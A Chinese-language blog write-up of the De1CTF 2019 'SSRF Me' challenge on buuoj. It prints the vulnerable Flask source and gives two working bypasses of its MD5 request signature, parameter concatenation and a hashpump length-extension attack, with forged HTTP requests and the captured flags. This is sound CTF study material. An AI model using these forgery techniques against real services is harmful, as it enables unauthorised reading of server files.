---
title: buuoj刷题记录4
date: 2019-12-28 21:16:16
tags:
 - web 
 - ctf  
 - buuctf
 - De1CTF
categories: 
 - 刷题记录
---
## [De1CTF 2019]SSRF Me

### 0x00 基础

大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。

<!--more-->

### 0x01 分析

题目提示 `flag在./flag.txt中`。

打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。


```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json

reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print(resp)
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较
            return True
        else:
            return False

#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))  # urllib.unquote 相当与  urldecode
    action = "scan"
    return getSign(action, param)

@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)
```

分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route("/geneSign", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数

大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`

在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。

在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为

`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。

### 0x02 开始操作

先获取到签名后的md5

访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`

返回为`0155303824bd0738b4ed0a52b7446c08`


```
GET /De1ta?param=flag.txt HTTP/1.1
Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 
```

结果

`{"code": 200, "data": "flag{04726554-0f9f-47f4-9c1a-114e21e68594}\n"}`

### 0x02 另一种解法

使用hashdump 利用哈希长度扩展攻击，

已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`

求`（secret+flag.txt+scanread）`

经过测试密钥是16位 加上scanread是24位。

```
root@kali:/tmp/HashPump# hashpump 
Input Signature: 40ad0bf20e771e768e9305810410c1b9
Input Data: scan   #写上原有数据
Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度
Input Data to Add: read   #拓展的数据
46a6ff04f7bede58de30e93410935976 #生成的MD5
scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read 
```

`burp suite`提交的数据

```
GET /De1ta?param=flag.txt HTTP/1.1
Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976

```

结果`{"code": 200, "data": "flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\n"}`

